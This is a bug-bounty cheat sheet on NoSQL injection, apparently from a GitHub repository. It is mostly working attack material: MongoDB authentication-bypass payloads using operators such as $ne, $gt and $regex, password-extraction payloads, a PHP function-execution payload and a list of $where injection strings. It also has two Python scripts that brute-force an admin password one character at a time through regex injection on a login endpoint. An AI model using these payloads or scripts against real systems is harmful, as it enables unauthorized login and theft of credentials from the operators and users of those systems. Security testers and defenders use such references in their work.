
## Introduction

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#introduction)

NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## How to Exploit

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#how-to-exploit)

### Authentication Bypass

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#authentication-bypass)

Basic authentication bypass using not equal ($ne) or greater ($gt)

```
in the request
- username[$ne]=toto&password[$ne]=toto
- login[$regex]=a.*&pass[$ne]=lol
- login[$gt]=admin&login[$lt]=test&pass[$ne]=1
- login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

The output is
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}

### Extract length information

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#extract-length-information)

username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}

### Extract data information

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#extract-data-information)

in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}

### Extract data with "in"

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#extract-data-with-in)

{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}

### PHP Arbitrary Function Execution

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#php-arbitrary-function-execution)

"user":{"$func": "var_dump"}

## Blind NoSQL

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#blind-nosql)

### POST

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#post)

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c

### GET

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#get)

import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print("Found one more char : %s" % (password+c))
        password += c

Another example using sleep to check vuln or not

```
'%2bsleep(1)%2b'
```

### MongoDB Payloads

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#mongodb-payloads)

true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1

## Tools

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#tools)

- [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)

## References

[](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md#references)

- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md)

